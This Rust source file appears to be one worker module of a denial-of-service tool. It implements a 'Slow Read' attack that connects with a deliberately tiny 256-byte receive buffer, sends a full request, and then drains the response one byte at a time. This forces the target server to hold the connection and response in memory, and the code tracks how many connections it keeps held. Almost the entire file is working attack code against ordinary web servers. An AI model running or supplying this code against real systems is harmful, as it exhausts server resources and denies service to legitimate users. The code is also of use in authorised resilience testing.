//! Slow Read worker (L7).
//!
//! The inverse of slowloris: send a *complete* request, but read the response
//! one byte at a time from a socket with a tiny receive buffer. Our advertised
//! TCP window stays near-zero, so the server cannot flush its response and must
//! hold it (and the connection) in its send buffer. Signal is held_connections.

use super::net::Target;
use super::{Governor, HeldGuard, Metrics, Shutdown};
use std::sync::atomic::Ordering::Relaxed;
use std::sync::Arc;
use std::time::Duration;
use tokio::io::{AsyncReadExt, AsyncWriteExt};

const RCVBUF: u32 = 256; // deliberately tiny OS receive buffer

pub async fn worker(
    idx: u32,
    target: Arc<Target>,
    request: Arc<[u8]>,
    metrics: Arc<Metrics>,
    gov: Arc<Governor>,
    shutdown: Arc<Shutdown>,
    trickle: Duration,
) {
    let mut down = shutdown.subscribe();

    loop {
        if *down.borrow() {
            return;
        }
        if !gov.active(idx) {
            tokio::select! {
                _ = down.changed() => {}
                _ = tokio::time::sleep(Duration::from_millis(100)) => {}
            }
            continue;
        }

        let mut conn = match target.connect_small_window(RCVBUF).await {
            Ok(c) => c,
            Err(_) => {
                metrics.errors.fetch_add(1, Relaxed);
                tokio::select! {
                    _ = down.changed() => return,
                    _ = tokio::time::sleep(Duration::from_millis(50)) => {}
                }
                continue;
            }
        };
        let _held = HeldGuard::new(&metrics.held_connections);
        metrics.requests_sent.fetch_add(1, Relaxed);

        if conn.write_all(&request).await.is_err() {
            metrics.errors.fetch_add(1, Relaxed);
            continue;
        }
        metrics.bytes_sent.fetch_add(request.len() as u64, Relaxed);

        // Drain the response as slowly as possible, one byte per tick.
        let mut byte = [0u8; 1];
        'read: loop {
            tokio::select! {
                _ = tokio::time::sleep(trickle) => {}
                _ = down.changed() => return,
            }
            if *down.borrow() {
                return;
            }
            if !gov.active(idx) {
                break 'read;
            }
            match conn.read(&mut byte).await {
                Ok(0) => break 'read,          // server finished / closed
                Ok(_) => {}                    // consumed a single byte; keep stalling
                Err(_) => {
                    metrics.errors.fetch_add(1, Relaxed);
                    break 'read;
                }
            }
        }
    }
}
